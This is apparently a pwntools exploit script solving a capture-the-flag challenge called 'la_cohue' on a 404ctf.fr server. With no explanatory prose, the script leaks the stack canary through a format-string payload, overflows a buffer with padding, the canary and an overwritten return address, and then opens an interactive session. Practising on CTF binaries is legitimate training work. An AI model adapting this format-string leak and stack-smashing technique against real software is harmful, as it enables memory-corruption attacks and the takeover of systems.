from pwn import *
import struct

e = ELF('la_cohue')

#p = e.process()
p = remote('challenges.404ctf.fr', 30223)

# %17$llx => leak canary

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

p.send(b'2\n')
p.send(b'%17$llx\n')
canary = p.recvline()
canary = int(canary.split(b' : ')[1][:-1], 16)
canary = p64(canary)
print("Canary:", canary)

input()

for _ in range(6):
	p.recvline()

func = struct.pack("<Q", 0x00400877)
print("func addr=",func)

print("Overwriting RIP")


p.send(b'1\n')
p.recvline()
p.recvline()

p.send(b'a'*72)
p.send(canary)
p.send(b'\x00' * 8)
p.send(func)
p.send(b'\n')

print("Overwrote")

for _ in range(7):
	p.recvline()

p.sendline(b'3\n')

p.interactive()